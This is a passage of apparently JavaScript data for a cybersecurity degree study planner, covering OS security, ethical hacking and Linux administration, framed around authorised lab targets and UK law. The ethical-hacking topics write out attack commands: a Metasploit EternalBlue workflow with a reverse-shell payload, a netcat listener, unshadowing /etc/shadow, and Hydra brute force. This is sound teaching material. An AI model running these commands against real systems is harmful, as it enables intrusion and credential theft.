+overview:"The OS manages I/O through a layered abstraction. Interrupts, DMA, and the purpose of each kernel I/O layer are assessed as detailed theory questions.",
+concepts:[
+{title:"Polling vs interrupt-driven I/O",body:"<ul><li><strong>Polling</strong> — CPU continuously checks device status. Simple but wastes cycles</li><li><strong>Interrupt-driven</strong> — device signals CPU via interrupt when ready. CPU free during I/O</li><li><strong>Interrupt vector</strong> — maps interrupt numbers to ISR handler addresses</li></ul>"},
+{title:"Direct Memory Access (DMA)",body:"<ul><li>CPU programs DMA controller with source, destination and byte count</li><li>DMA transfers directly between device and RAM — CPU is free</li><li>DMA interrupts CPU when transfer completes</li><li>Essential for high-throughput devices: NVMe, NIC, GPU</li></ul>"},
+{title:"Kernel I/O layer stack",body:"From user to hardware:<ul><li>User process → kernel I/O subsystem → device driver → controller hardware</li><li>Abstraction means applications are device-independent</li><li>Kernel layer handles: scheduling, buffering, caching, spooling</li></ul>"},
+{title:"Buffering, caching and spooling",body:"<ul><li><strong>Buffering</strong> — temporary storage bridging CPU/device speed mismatch</li><li><strong>Caching</strong> — recently accessed data in faster storage</li><li><strong>Spooling</strong> — queue jobs for single-user device (e.g. printer)</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#3B6D11",hours:"2 hrs",task:"Interrupts and polling",detail:"Draw event sequence from device interrupt to ISR return. Compare polling vs interrupt-driven."},
+{week:"Week 2",color:"#639922",hours:"3 hrs",task:"DMA and kernel layers",detail:"Trace a disk read through every layer from user process to hardware and back."},
+{week:"Week 3",color:"#97C459",hours:"2 hrs",task:"Definitions and past papers",detail:"Define buffering, caching and spooling precisely — they are commonly confused in exams."}],
+practice:["Trace sequence from user disk read() call to data returned in buffer","Compare polling vs interrupt-driven I/O — when is polling ever appropriate?","Why is DMA necessary for modern high-speed storage devices?","Distinguish buffering from caching with one example each"],
+resources:[{name:"OS Concepts Ch.12 — Silberschatz",desc:"Full I/O chapter"},{name:"Ben Eater — interrupts (YouTube)",desc:"Hardware-level explanation"},{name:"Linux Device Drivers (free online)",desc:"Driver architecture reference"}]},
+
+{name:"Security model",sub:"Privilege rings, Linux permissions, DAC/MAC/RBAC, VMs vs containers",
+overview:"OS security via hardware privilege levels and access control models is the foundation of system security — and connects directly to the Linux and Ethical Hacking modules.",
+concepts:[
+{title:"CPU privilege rings",body:"<ul><li><strong>Ring 0 (kernel mode)</strong> — full hardware access</li><li><strong>Ring 3 (user mode)</strong> — restricted; applications run here</li><li>User programs access hardware via <strong>system calls</strong> — controlled Ring 3→Ring 0 transitions via trap instruction</li><li>Prevents applications accessing hardware directly or reading other processes' memory</li></ul>"},
+{title:"Linux file permissions",body:"Three rwx sets: owner | group | others<ul><li>chmod 755 = rwxr-xr-x (r=4, w=2, x=1)</li><li><strong>setuid</strong> — execute as file owner (passwd runs as root)</li><li><strong>sticky bit</strong> — only owner deletes own files (/tmp)</li><li>Find setuid: <code>find / -perm -4000 2>/dev/null</code></li></ul>"},
+{title:"Access control models",body:"<ul><li><strong>DAC</strong> — owner controls access (Unix permissions, ACLs)</li><li><strong>MAC</strong> — admin sets policy, users can't override (SELinux, AppArmor)</li><li><strong>RBAC</strong> — permissions on roles; users assigned to roles</li></ul>"},
+{title:"VMs vs containers",body:"<ul><li><strong>Type 1 hypervisor</strong> — bare metal; each VM has own kernel (ESXi, KVM)</li><li><strong>Type 2 hypervisor</strong> — on host OS (VirtualBox, VMware Workstation)</li><li><strong>Containers</strong> — share host kernel; isolated user space (Docker)</li><li>VMs: stronger isolation. Containers: lighter but kernel exploit can escape</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#3B6D11",hours:"2 hrs",task:"Privilege rings",detail:"Trace the path of a system call. Explain why privilege separation exists."},
+{week:"Week 2",color:"#639922",hours:"3 hrs",task:"Linux permissions",detail:"Practice chmod, chown, getfacl/setfacl. Find all setuid binaries on your VM."},
+{week:"Week 3",color:"#97C459",hours:"2 hrs",task:"Access control models",detail:"Compare DAC/MAC/RBAC with examples. Compare VM vs container security."}],
+practice:["Decode -rwsr-x--- and explain every component","Difference between DAC and MAC — one real example each","How does a system call transition from user mode to kernel mode?","Security pros and cons of containers vs virtual machines"],
+resources:[{name:"DigitalOcean — Linux permissions guide",desc:"Practical chmod, chown, ACL reference"},{name:"SELinux documentation",desc:"MAC on Linux"},{name:"Docker security overview",desc:"How containers achieve isolation"}]}
+]},
+
+{id:"eh",name:"Ethical Hacking: Tools & Techniques",shortName:"Eth. Hacking",icon:"ti-shield-lock",bg:"#FAECE7",iconColor:"#993C1D",meta:"Core module · SCQF Level 8",
+desc:"Introduces ethical hacking methodology and penetration testing tools. Lab reports must follow a professional structure with screenshots and clear explanations at every step.",
+assess:[{l:"Practical",r:"Pentest lab report — 60%"},{l:"Theory",r:"Exam / quiz — 40%"}],
+topics:[
+{name:"Phases of hacking",sub:"CEH 5 phases, rules of engagement, pentest types, report writing",
+overview:"Every lab report must follow the CEH methodology structure. Theory exams test knowledge of each phase, legal context, and the difference between test types.",
+concepts:[
+{title:"The five CEH phases",body:"<ol style='margin:6px 0 0 1.2rem'><li><strong>Reconnaissance</strong> — gather info (passive and active)</li><li><strong>Scanning</strong> — probe for open ports, services, vulnerabilities</li><li><strong>Gaining access</strong> — exploit a vulnerability</li><li><strong>Maintaining access</strong> — persistence, backdoors</li><li><strong>Clearing tracks</strong> — delete logs, hide presence</li></ol>In ethical hacking: all agreed in writing, all steps documented, no harm caused."},
+{title:"Rules of engagement",body:"Define before any test:<ul><li><strong>Scope</strong> — which IPs/systems in or out</li><li><strong>Authorisation</strong> — written permission (legal protection under CMA 1990)</li><li><strong>Timeline</strong> — agreed window to minimise disruption</li><li><strong>Communication</strong> — who to contact on critical finding</li></ul>"},
+{title:"Pentest types",body:"<ul><li><strong>Black box</strong> — no prior knowledge; simulates external attacker</li><li><strong>White box</strong> — full info: source code, network diagrams</li><li><strong>Grey box</strong> — partial knowledge (e.g. user credentials)</li><li><strong>Internal</strong> — from inside the network</li><li><strong>Social engineering</strong> — test human vulnerabilities</li></ul>"},
+{title:"Report structure",body:"<ul><li><strong>Executive summary</strong> — non-technical for management</li><li><strong>Scope and methodology</strong></li><li><strong>Findings</strong> — each vuln with CVSS severity, evidence screenshots, impact, remediation</li><li><strong>Risk rating</strong> — Critical/High/Medium/Low/Info</li></ul>Missing screenshots or unexplained steps lose marks."}],
+timeline:[
+{week:"Week 1",color:"#993C1D",hours:"2 hrs",task:"5 phases and legal framework",detail:"Memorise CEH phases. Understand the legal framework before touching any tools."},
+{week:"Week 2",color:"#D85A30",hours:"3 hrs",task:"ROE and pentest types",detail:"Study rules of engagement and test types — they appear frequently in theory exams."},
+{week:"Week 3",color:"#F0997B",hours:"3 hrs",task:"Report writing practice",detail:"Write a mock pentest finding. Focus on evidence, description and specific remediation."}],
+practice:["Write rules of engagement for a fictional pentest of a university website","Explain black box vs white box testing — advantages of each","What must a pentest report finding section contain to be professionally valid?","Describe a scenario where a tester crosses an ethical line even with written permission"],
+resources:[{name:"CEH v12 guide — EC-Council",desc:"Official guide covering all phases"},{name:"PTES — Penetration Testing Execution Standard",desc:"Industry methodology reference"},{name:"TryHackMe — Jr Pentester path",desc:"Guided practical following the pentest lifecycle"}]},
+
+{name:"Reconnaissance",sub:"OSINT, passive vs active, DNS enumeration, Google dorks",
+overview:"Recon gathers target information before any systems are touched. Passive leaves no trace; active interacts with target systems. Both are assessed in labs and theory exams.",
+concepts:[
+{title:"Passive vs active recon",body:"<strong>Passive</strong> — no direct contact, no logs on target:<ul><li>OSINT: Google, LinkedIn, WHOIS, Shodan, theHarvester</li></ul><strong>Active</strong> — directly interacting with target:<ul><li>DNS queries to target nameservers, social engineering</li><li>Leaves traces — higher detection risk</li></ul>"},
+{title:"OSINT tools",body:"<ul><li><strong>Google dorks</strong>: <code>site:target.com filetype:pdf</code>, <code>intitle:\"index of\"</code></li><li><strong>Shodan</strong> — search engine for internet-connected devices</li><li><strong>WHOIS</strong> — domain owner, registrar, registration dates</li><li><strong>theHarvester</strong> — emails, names, subdomains from public sources</li><li><strong>Maltego</strong> — visualises entity relationships</li></ul>"},
+{title:"DNS enumeration",body:"<ul><li><code>nslookup domain.com</code>, <code>dig domain.com ANY</code></li><li>Record types: A (IPv4), AAAA (IPv6), MX (mail), NS (nameserver), TXT, CNAME</li><li><strong>Zone transfer</strong>: <code>dig axfr @nameserver domain.com</code> — dumps all records if misconfigured. Major vuln if exposed</li><li>Practice against zonetransfer.me</li></ul>"},
+{title:"Social media OSINT",body:"<ul><li>LinkedIn — employee names, tech stack in job posts</li><li>GitHub — code leaks, API keys in public repos</li><li><code>hunter.io</code> — find company email format</li><li><code>haveibeenpwned.com</code> — check emails in data breaches</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#993C1D",hours:"3 hrs",task:"OSINT tools",detail:"Practice Google dorks and theHarvester on a permitted domain. Document all findings."},
+{week:"Week 2",color:"#D85A30",hours:"3 hrs",task:"DNS enumeration",detail:"Run dig against public domains. Attempt zone transfer against zonetransfer.me."},
+{week:"Week 3",color:"#F0997B",hours:"2 hrs",task:"Report writing",detail:"Every tool output needs a plain-English explanation — practise writing these up professionally."}],
+practice:["Use theHarvester to gather emails for a public domain — write findings in report format","Attempt zone transfer against zonetransfer.me — document what you find","Find 3 Google dorks that could expose sensitive files on a target site","Explain the legal difference between passive and active reconnaissance under CMA 1990"],
+resources:[{name:"OSINT Framework — osintframework.com",desc:"Visual map of all OSINT tools"},{name:"zonetransfer.me",desc:"Safe zone transfer practice target"},{name:"GHDB — exploit-db.com",desc:"Google Hacking Database of dork queries"}]},
+
+{name:"Scanning & enumeration",sub:"Nmap flags, scan types, service detection, Netcat, Nessus",
+overview:"Scanning identifies live hosts, open ports, services and OS versions. Nmap is the core tool — know every important flag, what each scan type reveals, and how to document findings.",
+concepts:[
+{title:"Nmap core flags",body:"<ul><li><code>-sS</code> — SYN/stealth (half-open, less logged); <code>-sT</code> — full TCP connect</li><li><code>-sU</code> — UDP scan; <code>-sV</code> — service version; <code>-O</code> — OS fingerprinting</li><li><code>-A</code> — aggressive (OS + version + scripts + traceroute)</li><li><code>-p 1-65535</code> — all ports; <code>-p 22,80,443</code> — specific ports</li><li><code>--script vuln</code> — run vulnerability NSE scripts</li></ul>"},
+{title:"Port states and scan types",body:"<ul><li><strong>open</strong> — service listening; <strong>closed</strong> — no service; <strong>filtered</strong> — firewall dropping packets</li><li>SYN scan: SYN → SYN-ACK → RST. Less logged, requires root</li><li>TCP connect: full 3-way handshake. Logged but no root needed</li></ul>"},
+{title:"Banner grabbing with Netcat",body:"<ul><li><code>nc target 22</code> — reads SSH banner</li><li><code>nc target 80</code> then send <code>HEAD / HTTP/1.0</code></li><li><code>nc -lvnp 4444</code> — listen for incoming connections (reverse shells)</li><li>enum4linux — SMB enumeration; snmpwalk — SNMP</li></ul>"},
+{title:"Vulnerability scanning",body:"<ul><li><strong>Nessus</strong> — commercial; prioritised CVE findings with CVSS scores</li><li><strong>OpenVAS</strong> — open-source alternative</li><li>Do NOT run against systems without explicit written permission</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#993C1D",hours:"3 hrs",task:"Nmap fundamentals",detail:"Run Nmap against Metasploitable2 with different flags. Document every flag and what it reveals."},
+{week:"Week 2",color:"#D85A30",hours:"3 hrs",task:"Service enumeration",detail:"Practice banner grabbing with Netcat. Run enum4linux. Document all findings in report format."},
+{week:"Week 3",color:"#F0997B",hours:"2 hrs",task:"Vulnerability scanning",detail:"Run Nessus or OpenVAS in your lab. Interpret CVSS scores. Map findings to report structure."}],
+practice:["Run nmap -sV -O -p 1-1024 against Metasploitable2 and document output","Compare SYN (-sS) vs TCP connect (-sT) — what differs in the server logs?","Banner grab ports 21, 22 and 80 on a practice target using Netcat","Explain what 'filtered' means in Nmap output and what it implies"],
+resources:[{name:"Nmap reference guide — nmap.org/book",desc:"Definitive Nmap documentation"},{name:"Metasploitable2 setup guide",desc:"Intentionally vulnerable VM"},{name:"TryHackMe — Nmap room",desc:"Guided interactive Nmap exercises"}]},
+
+{name:"Exploitation",sub:"Metasploit, CVEs, payloads, reverse shells, Meterpreter",
+overview:"Exploitation uses discovered vulnerabilities to gain access. Metasploit is the industry-standard framework. Lab reports must document every step with commands and screenshots.",
+concepts:[
+{title:"Metasploit module types",body:"<ul><li><strong>Exploits</strong> — take advantage of a specific vulnerability</li><li><strong>Payloads</strong> — code run after successful exploitation</li><li><strong>Auxiliaries</strong> — scanning, fuzzing, enumeration</li><li><strong>Post-exploitation</strong> — privilege escalation, pivoting, persistence</li><li><strong>Encoders</strong> — modify payload to evade AV</li></ul>"},
+{title:"msfconsole workflow",body:"<pre>msfconsole\nsearch ms17-010\nuse exploit/windows/smb/ms17_010_eternalblue\nshow options\nset RHOSTS 192.168.1.10\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.5\nexploit</pre>"},
+{title:"Reverse vs bind shells and Meterpreter",body:"<ul><li><strong>Reverse shell</strong> — target connects back to attacker. Gets through firewalls. Most common</li><li><strong>Bind shell</strong> — attacker connects to port opened on target</li><li><strong>Meterpreter</strong> — in-memory advanced payload: upload/download, screenshot, keylogger, pivot</li></ul>"},
+{title:"CVE database and CVSS",body:"<ul><li>CVE — unique identifier: CVE-YEAR-NUMBER</li><li>CVSS score 0-10: Critical (9+), High (7-8.9), Medium (4-6.9), Low (&lt;4)</li><li>NVD — nvd.nist.gov — full CVE database</li><li>Exploit-DB — exploit-db.com — public exploits; <code>searchsploit</code> CLI</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#993C1D",hours:"4 hrs",task:"Metasploit structure",detail:"Explore msfconsole: search, use, show options, set. Understand all module types."},
+{week:"Week 2",color:"#D85A30",hours:"4 hrs",task:"Lab exploitation",detail:"Exploit a service on Metasploitable2. Document every command and screenshot."},
+{week:"Week 3",color:"#F0997B",hours:"3 hrs",task:"CVE research",detail:"Find a CVE for a Metasploitable service. Look up on NVD. Try manual exploit alongside Metasploit."}],
+practice:["Exploit vsftpd 2.3.4 backdoor on Metasploitable2 — document every step","Explain reverse shell vs bind shell — when would you use each?","Look up CVE-2021-44228 (Log4Shell) — what is the CVSS score and what does it mean?","Use searchsploit to find exploits for UnrealIRCd — what do you find?"],
+resources:[{name:"Metasploit Unleashed — Offensive Security",desc:"Free comprehensive Metasploit course"},{name:"NVD — nvd.nist.gov",desc:"Official CVE database with CVSS scores"},{name:"Exploit-DB — exploit-db.com",desc:"Public exploit archive"}]},
+
+{name:"Password attacks",sub:"Hash types, salts, John the Ripper, Hashcat, Hydra",
+overview:"Password attacks are among the most effective offensive techniques. Understanding how passwords are stored and the tools to crack them is essential for attack and defence.",
+concepts:[
+{title:"How passwords are stored",body:"<ul><li><strong>Hash function</strong> — one-way, fixed-length output</li><li>MD5 — broken; SHA-1 — deprecated; SHA-256/512 — still used</li><li><strong>bcrypt</strong> — designed for passwords: includes salt, intentionally slow</li><li><strong>Salt</strong> — random data added before hashing; defeats rainbow tables</li></ul>"},
+{title:"Attack types",body:"<ul><li><strong>Dictionary</strong> — try every word in wordlist (rockyou.txt: 14M passwords)</li><li><strong>Brute force</strong> — every combination. Guaranteed but slow for long passwords</li><li><strong>Rule-based</strong> — transform wordlist (capitalise, add numbers, l33t)</li><li><strong>Rainbow tables</strong> — precomputed hash→plaintext. Defeated by salting</li></ul>"},
+{title:"John the Ripper and Hashcat",body:"<strong>John:</strong><ul><li><code>john hashes.txt --wordlist=rockyou.txt</code></li><li><code>john --show hashes.txt</code></li><li><code>unshadow /etc/passwd /etc/shadow > combined.txt</code></li></ul><strong>Hashcat (GPU-accelerated):</strong><ul><li><code>hashcat -m 0 hashes.txt rockyou.txt</code> (MD5)</li><li>Modes: 0=MD5, 100=SHA1, 1800=sha512crypt, 3200=bcrypt</li></ul>"},
+{title:"Hydra — online brute force",body:"<ul><li><code>hydra -l admin -P rockyou.txt ssh://192.168.1.10</code></li><li><code>hydra -L users.txt -P passwords.txt ftp://target</code></li><li>Supports SSH, FTP, HTTP, RDP, SMB, MySQL and more</li><li>Only run against systems you are authorised to test</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#993C1D",hours:"3 hrs",task:"Hash types and salts",detail:"Understand why bcrypt differs from MD5. Generate hashes and understand the role of salts."},
+{week:"Week 2",color:"#D85A30",hours:"4 hrs",task:"John and Hashcat",detail:"Crack MD5 and NTLM hashes with John using rockyou.txt. Try rule-based attacks."},
+{week:"Week 3",color:"#F0997B",hours:"2 hrs",task:"Hydra online attacks",detail:"Practice Hydra against lab SSH. Document command and output in report format."}],
+practice:["Generate MD5 and bcrypt hashes of the same password — compare their structure","Use John with rockyou.txt to crack a set of SHA-1 hashes","Explain why rainbow tables fail against properly salted passwords","Configure Hydra for SSH brute force against a lab VM — document your findings"],
+resources:[{name:"CrackStation.net",desc:"Online hash cracker — shows what gets cracked quickly"},{name:"Hashes.com",desc:"Hash identification reference"},{name:"rockyou.txt",desc:"Standard wordlist on Kali: /usr/share/wordlists/rockyou.txt"}]},
+
+{name:"Legal & ethics",sub:"Computer Misuse Act 1990, GDPR, CEH ethics, responsible disclosure",
+overview:"Legal framing is non-negotiable — assessed in theory exams and must appear in every lab report. Know specific Act section numbers, not vague statements.",
+concepts:[
+{title:"Computer Misuse Act 1990",body:"Primary UK law for computer security:<ul><li><strong>S1</strong> — Unauthorised access. Up to 2 years</li><li><strong>S2</strong> — Unauthorised access with intent to commit further offences. Up to 5 years</li><li><strong>S3</strong> — Unauthorised modification (malware). Up to 10 years</li><li><strong>S3A</strong> — Making/supplying hacking tools. Up to 2 years</li><li>Key word: <em>unauthorised</em> — written permission is your legal protection</li></ul>"},
+{title:"GDPR",body:"<ul><li>Personal data found during pentest must be handled carefully</li><li><strong>72-hour breach notification</strong> — client must notify ICO within 72 hours</li><li>Pentest reports with personal data must be securely transmitted and stored</li><li>UK GDPR is the post-Brexit version, largely mirroring EU GDPR</li></ul>"},
+{title:"CEH code of ethics",body:"<ul><li>Always obtain written authorisation before testing</li><li>Do not access systems beyond agreed scope</li><li>Protect confidentiality of findings (sign NDA)</li><li>Report all discovered vulnerabilities to client</li><li>Do not use findings for personal gain</li></ul>"},
+{title:"Responsible disclosure",body:"<ul><li>Notify vendor privately and give time to patch before publishing</li><li><strong>90-day standard</strong> — Google Project Zero's coordinated disclosure timeline</li><li><strong>Bug bounty</strong> — companies pay researchers (HackerOne, Bugcrowd)</li><li><strong>Full disclosure</strong> — immediate publication; pressures vendors but enables attackers</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#993C1D",hours:"2 hrs",task:"Computer Misuse Act",detail:"Read all four sections. For each, think of an ethical hacking scenario that could cross the line."},
+{week:"Week 2",color:"#D85A30",hours:"2 hrs",task:"GDPR and ethics",detail:"Understand how GDPR applies to pentesting. Study the CEH code of ethics."},
+{week:"Week 3",color:"#F0997B",hours:"2 hrs",task:"Past theory questions",detail:"Exam markers want specific legal references. Practise citing the CMA section number."}],
+practice:["Which CMA section applies to: (a) unauthorised port scan, (b) installing keylogger, (c) selling a RAT?","How should a researcher handle finding SQL injection on a public website they weren't hired to test?","What must a pentest agreement contain to legally protect the tester?","Explain the 72-hour GDPR breach notification requirement"],
+resources:[{name:"Computer Misuse Act 1990 — legislation.gov.uk",desc:"Full text of the Act"},{name:"ICO — GDPR guidance (ico.org.uk)",desc:"UK data protection authority"},{name:"HackerOne disclosure guidelines",desc:"Practical responsible disclosure process"}]}
+]},
+
+{id:"linux",name:"Linux: Tools and Administration",shortName:"Linux",icon:"ti-terminal-2",bg:"#F1EFE8",iconColor:"#444441",meta:"Core module · SCQF Level 8",
+desc:"Develops practical Linux command-line skills for system administration and security. All Kali security tools run on Linux — a strong terminal foundation underpins every other cyber security module.",
+assess:[{l:"Practical",r:"Lab tasks / portfolio — 60%"},{l:"Written",r:"Short answer test — 40%"}],
+topics:[
+{name:"Shell & bash scripting",sub:"Variables, loops, conditionals, functions, argument handling",
+overview:"Bash scripting is assessed practically (write a script) and in written tests (read and explain code). The skill also underpins security tool building in the Programming module.",
+concepts:[
+{title:"Script structure",body:"<ul><li>Shebang: <code>#!/bin/bash</code></li><li><code>chmod +x script.sh</code> then <code>./script.sh</code></li><li><code>echo &quot;text&quot;</code> — print; <code># comment</code> — ignored; <code>exit 0</code> — success</li></ul>"},
+{title:"Variables and arguments",body:"<ul><li><code>name=&quot;Alice&quot;</code> (no spaces); access as <code>$name</code></li><li><code>$1</code>, <code>$2</code> — positional args; <code>$#</code> — count; <code>$@</code> — all args</li><li>Command substitution: <code>result=$(command)</code></li><li>Arithmetic: <code>$((5 + 3))</code></li></ul>"},
+{title:"Conditionals",body:"<ul><li><code>if [ condition ]; then ... elif ...; else ...; fi</code></li><li>String: <code>[ &quot;$a&quot; = &quot;$b&quot; ]</code>, <code>[ -z &quot;$str&quot; ]</code> (empty), <code>[ -n &quot;$str&quot; ]</code> (not empty)</li><li>Numeric: <code>[ $a -eq $b ]</code> (-eq -ne -lt -gt -le -ge)</li><li>File: <code>[ -f file ]</code>, <code>[ -d dir ]</code>, <code>[ -x file ]</code></li></ul>"},
+{title:"Loops and functions",body:"<strong>For:</strong> <code>for i in $(seq 1 10); do echo $i; done</code><br><strong>While reading file:</strong> <code>while IFS= read -r line; do echo &quot;$line&quot;; done &lt; file.txt</code><br><strong>Function:</strong> <code>my_func() { echo &quot;Hello $1&quot;; }; my_func &quot;World&quot;</code>"}],
+timeline:[
+{week:"Week 1",color:"#444441",hours:"3 hrs",task:"Variables and conditionals",detail:"Write scripts accepting arguments, validating them, and producing output. Practice all comparison operators."},
+{week:"Week 2",color:"#888780",hours:"4 hrs",task:"Loops and file processing",detail:"Write scripts processing files line by line, looping directories, counting and filtering content."},
+{week:"Week 3",color:"#B4B2A9",hours:"3 hrs",task:"Functions and complete scripts",detail:"Build a complete admin script using functions (log analyser or backup tool). Clean and comment code."}],
+practice:["Write a script accepting a filename, checking it exists, counting lines","Loop all .log files in /var/log and print lines containing ERROR","Create a function validating IP address format using regex","Write a script generating all 4-digit PIN combinations 0000–9999"],
+resources:[{name:"Bash scripting guide — tldp.org",desc:"Comprehensive free bash reference"},{name:"ShellCheck — shellcheck.net",desc:"Online bash linter"},{name:"OverTheWire: Bandit",desc:"Learn bash by solving Linux challenges"}]},
+
+{name:"File system navigation",sub:"Permissions, ownership, chmod, find, hard/soft links",
+overview:"Confident navigation and permission management is a prerequisite for security work. Misconfigurations in file permissions are one of the most common privilege escalation vectors.",
+concepts:[
+{title:"Directory structure",body:"<ul><li><code>/etc</code> — config; <code>/var</code> — logs and variable data; <code>/tmp</code> — temp (world-writable)</li><li><code>/home</code> — user homes; <code>/usr/bin</code> — programs; <code>/proc</code> — virtual process info FS</li><li><code>cd -</code> — previous directory; <code>ls -la</code> — long listing with hidden files</li></ul>"},
+{title:"Permissions in detail",body:"<code>-rwxr-xr-- 1 alice staff 4096 file.sh</code><ul><li>Position 1: - (file), d (directory), l (symlink)</li><li>Positions 2-10: owner rwx, group r-x, others r--</li><li>r=4, w=2, x=1 → chmod 754; chmod u+x (symbolic)</li><li>Directories: x=enter, r=list contents, w=create/delete</li></ul>"},
+{title:"Special permission bits",body:"<ul><li><strong>setuid (s)</strong> — execute as file owner: <code>chmod u+s file</code></li><li><strong>setgid (s)</strong> — execute as group</li><li><strong>sticky bit (t)</strong> — only owner deletes own files: <code>chmod +t /tmp</code></li><li>Find setuid: <code>find / -perm -4000 2>/dev/null</code> — common priv esc check</li></ul>"},
+{title:"find command and links",body:"<strong>find:</strong><ul><li><code>find / -name &quot;*.conf&quot;</code>, <code>find / -perm -4000</code>, <code>find . -mtime -1</code></li></ul><strong>Links:</strong><ul><li>Hard link: <code>ln file hardlink</code> — same inode, survives original deletion</li><li>Soft link: <code>ln -s target symlink</code> — path pointer, breaks if target moved</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#444441",hours:"3 hrs",task:"Navigation and permissions",detail:"Navigate the full Linux tree. Practice both symbolic and numeric chmod notation."},
+{week:"Week 2",color:"#888780",hours:"3 hrs",task:"Special permissions and find",detail:"Find setuid files on your VM. Use find with multiple conditions. Check GTFOBins for each."},
+{week:"Week 3",color:"#B4B2A9",hours:"2 hrs",task:"Links and ownership",detail:"Create hard and soft links. Change ownership with chown. Understand chown vs chmod."}],
+practice:["Find all files in /var/log owned by root but writable by group","Set up a directory so new files inherit group via setgid","Find setuid binaries and check GTFOBins — any privilege escalation vectors?","Explain why /tmp has the sticky bit and what breaks without it"],
+resources:[{name:"Linux FHS",desc:"Defines the purpose of each directory"},{name:"Ryans Tutorials — Linux permissions",desc:"Clear beginner permissions guide"},{name:"GTFOBins — gtfobins.github.io",desc:"Setuid binaries exploitable for privilege escalation"}]},
+
+{name:"Process management",sub:"ps, kill, signals, systemd, cron, background jobs",
+overview:"Managing processes is a daily Linux admin task. Starting, stopping, scheduling and monitoring processes is tested in both practical labs and short answer tests.",
+concepts:[
+{title:"Viewing processes",body:"<ul><li><code>ps aux</code> — all processes, all users, full detail</li><li><code>top</code> / <code>htop</code> — real-time interactive viewer</li><li>Key columns: PID, PPID, %CPU, %MEM, STAT (S=sleeping, R=running, Z=zombie)</li></ul>"},
+{title:"Signals and kill commands",body:"<ul><li><code>kill PID</code> — SIGTERM (15): graceful termination request</li><li><code>kill -9 PID</code> — SIGKILL: force terminate immediately</li><li><code>kill -HUP PID</code> — SIGHUP (1): reload config</li><li><code>killall firefox</code>; <code>pkill -u alice</code></li><li>Zombie: process finished, parent hasn't called wait() — shown as Z</li></ul>"},
+{title:"Background jobs",body:"<ul><li><code>command &amp;</code> — background; <code>jobs</code> — list; <code>fg %1</code> — foreground</li><li>Ctrl+Z — suspend foreground process</li><li><code>nohup command &amp;</code> — immune to hangup; persists after logout</li><li>tmux or screen — keep sessions alive across SSH</li></ul>"},
+{title:"systemd and cron",body:"<strong>systemd:</strong><ul><li><code>systemctl start|stop|restart|status service</code></li><li><code>systemctl enable service</code> — start on boot</li><li><code>journalctl -u nginx -f</code> — follow logs</li></ul><strong>cron:</strong><ul><li>Format: <code>min hour day month weekday command</code></li><li><code>*/5 * * * * /script.sh</code> — every 5 minutes</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#444441",hours:"2 hrs",task:"ps and kill",detail:"Run ps aux and understand every column. Kill by PID and name. Create a zombie and observe it."},
+{week:"Week 2",color:"#888780",hours:"3 hrs",task:"systemd",detail:"Enable/start/stop/check services. Read journalctl. Create a simple service unit file."},
+{week:"Week 3",color:"#B4B2A9",hours:"2 hrs",task:"Cron scheduling",detail:"Set up multiple cron jobs. Test them. Understand /etc/cron.d vs personal crontab."}],
+practice:["Find all processes running as root using ps and grep","Write a cron job appending current date to a log file every 5 minutes","Create a systemd service unit running a bash script on startup","Difference between SIGTERM and SIGKILL — when would you use each?"],
+resources:[{name:"systemd docs — freedesktop.org",desc:"Official systemd reference"},{name:"crontab.guru",desc:"Interactive cron expression builder"},{name:"DigitalOcean — Linux process management",desc:"Practical guide to signals and job control"}]},
+
+{name:"Networking tools",sub:"ip, ss, netstat, ssh, scp, curl, tcpdump",
+overview:"Linux networking tools are used for configuration, monitoring and security testing. These appear in practical lab assessments — know the commands and how to interpret their output.",
+concepts:[
+{title:"Network interface configuration",body:"<ul><li><code>ip addr</code> — show all interfaces and IPs</li><li><code>ip link</code> — link-layer info (MAC, state)</li><li><code>ip route</code> — routing table</li><li><code>ip addr add 192.168.1.100/24 dev eth0</code> — add IP</li><li><code>hostname -I</code> — quick IP list</li></ul>"},
+{title:"Connection monitoring",body:"<ul><li><code>ss -tulnp</code> — listening ports + owning process</li><li><code>lsof -i :80</code> — what's using port 80?</li><li><code>tcpdump -i eth0 port 80</code> — capture traffic</li><li><code>ping host</code>, <code>traceroute host</code>, <code>mtr host</code></li></ul>"},
+{title:"SSH — remote access",body:"<ul><li><code>ssh user@host</code>; <code>ssh -p 2222 user@host</code></li><li><code>ssh -i keyfile user@host</code> — key authentication</li><li><code>scp file user@host:/path</code> — copy to remote</li><li><code>ssh-keygen -t ed25519</code> — generate key pair</li><li><code>ssh-copy-id user@host</code> — install public key</li></ul>"},
+{title:"curl and wget",body:"<ul><li><code>curl https://example.com</code> — fetch URL</li><li><code>curl -I url</code> — HTTP headers only</li><li><code>curl -X POST -d 'data' -H 'Content-Type: application/json' url</code></li><li><code>wget https://example.com/file.zip</code> — download to disk</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#444441",hours:"3 hrs",task:"Interface config and connectivity",detail:"Practice ip and ifconfig. Configure static IPs in your VM. Test with ping and traceroute."},
+{week:"Week 2",color:"#888780",hours:"3 hrs",task:"SSH and file transfer",detail:"Set up key-based SSH auth. Use scp. Configure ~/.ssh/config with host alias."},
+{week:"Week 3",color:"#B4B2A9",hours:"3 hrs",task:"Monitoring and curl",detail:"Use ss and tcpdump. Test web endpoints with curl. Identify request/response in tcpdump output."}],
+practice:["List all listening ports and identify the process for each with ss -tulnp","Set up password-less SSH key authentication between two VMs","Use curl to make a POST request with JSON data to a local web server","Capture HTTP traffic with tcpdump while making a curl request — identify the exchange"],
+resources:[{name:"ss(8) man page",desc:"Complete reference"},{name:"SSH Mastery — Michael W Lucas",desc:"Definitive SSH guide"},{name:"curl docs — curl.se/docs",desc:"Official curl reference"}]},
+
+{name:"Package management",sub:"apt, dpkg, repositories, sources.list, GPG keys",
+overview:"Package management installs, updates and removes software. On Debian/Ubuntu/Kali, apt and dpkg are the primary tools — know the difference and when to use each.",
+concepts:[
